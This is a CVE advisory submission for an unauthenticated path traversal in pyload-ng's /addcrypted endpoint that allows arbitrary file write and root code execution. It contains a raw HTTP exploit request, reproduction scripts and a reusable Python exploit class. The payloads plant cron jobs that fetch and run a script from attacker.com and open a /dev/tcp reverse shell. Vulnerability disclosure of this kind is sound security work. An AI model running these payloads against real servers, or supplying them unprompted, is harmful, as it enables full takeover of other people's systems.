**🛡️ CVE Advisory Submission**

## Summary
**Path Traversal in pyLoad-ng CNL Blueprint via `package` parameter allows Arbitrary File Write leading to Remote Code Execution (RCE)**
The `addcrypted` endpoint in `pyload-ng` suffers from an unsafe path construction vulnerability, allowing unauthenticated attackers to write arbitrary files outside the designated storage directory. This can be abused to overwrite critical system files, including cron jobs and systemd services, leading to privilege escalation and remote code execution as root.


## Details

* **Project**: [pyload-ng on PyPI](https://pypi.org/project/pyload-ng/)
* **Affected Endpoint**: `POST /addcrypted`
* **Vulnerable Parameter**: `package`
* **File Affected**: `src/pyload/webui/app/blueprints/cnl_blueprint.py`
* **Issue**: No path normalization or containment check on `package` value used in file path join.

#### Vulnerable Code

```python
package = request.form["package"]
dl_path = self.config.get("general", "storage_folder")
dlc_path = os.path.join(dl_path, package, f"{package}.dlc")
with open(dlc_path, mode="wb") as fp:
    fp.write(request.form["crypted"].encode())
```

---
## Proof via BurpSuite HTTP Request

```http
POST /addcrypted HTTP/1.1
Host: target.com:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

package=../../../../etc/cron.d/payload&crypted=KioqICogKiAqKiByb290IGN1cmwgLXMgaHR0cDovL2F0dGFja2VyLmNvbS9yLnNoIHwgYmFzaA==
```

Decoded payload:

```bash
* * * * * root curl -s http://attacker.com/r.sh | bash
```


## Reproduction Steps

1. **Setup vulnerable environment**

```bash
git clone https://github.com/pyload/pyload
cd pyload && git checkout 06ea871
pip install -r requirements.txt
python -m pyload.web --port 8000
```

2. **Send crafted POST**

```python
import requests, base64

payload = "* * * * * root curl http://attacker.com/rev.sh | bash"
b64 = base64.b64encode(payload.encode()).decode()

requests.post("http://localhost:8000/addcrypted", data={
    "package": "../../../../etc/cron.d/exploit",
    "crypted": b64
})
```

3. **Verify**

```bash
ls /etc/cron.d/
tail -f /var/log/cron.log
```


### Impact
The discovered vulnerability in `pyload-ng` presents a severe security flaw that allows unauthenticated, remote attackers to write arbitrary files to any location on the server’s filesystem, bypassing intended directory boundaries. This occurs due to improper validation of the `package` parameter in the `/addcrypted` HTTP endpoint, which is directly concatenated into a filesystem path using Python's `os.path.join()` without applying any sanitization or normalization.
An attacker can:

* Overwrite files in `/etc/cron.d`, `.bashrc`, `~/.ssh/authorized_keys`, or Windows startup folders
* Achieve **RCE as root** via cron job or systemd service injection
* Escape containers by targeting host-mounted paths like `/proc` or `/var/run/docker.sock`
* Hijack or backdoor the application via config poisoning or download cache tampering

###  Vulnerable Exploit 

```python3
class pyLoadExploit:
    def __init__(self, url):
        self.url = f"{url}/addcrypted"

    def deploy(self, target_path, payload):
        import os, base64
        traversal = "../" * 10 + target_path.lstrip("/")
        data = {
            "package": traversal,
            "crypted": base64.b64encode(payload.encode()).decode()
        }
        return requests.post(self.url, data=data)

# Deploy reverse shell
exploit = pyLoadExploit("http://localhost:8000")
exploit.deploy("/etc/cron.d/pwned", "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1")
```

